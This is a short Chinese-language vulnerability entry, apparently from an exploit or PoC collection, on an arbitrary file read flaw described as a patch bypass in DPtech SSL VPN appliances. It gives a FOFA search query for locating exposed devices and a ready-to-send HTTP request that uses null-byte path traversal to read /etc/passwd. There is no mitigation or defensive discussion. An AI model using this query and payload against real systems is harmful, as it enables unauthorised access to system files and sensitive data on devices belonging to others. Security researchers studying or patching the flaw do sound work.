## 迪普DPTech-VPN任意文件读取(补丁绕过)
杭州迪普科技股份有限公司DPtech SSL VPN存在任意文件读取漏洞，攻击者可利用该漏洞获敏感信息。

## fofa
```javascript
title=="SSL VPN Service" && header="Dptech" || cert="DPtechCa"
```

## poc
```javascript
GET /.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```
![image-20241012132203032](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121322100.png)
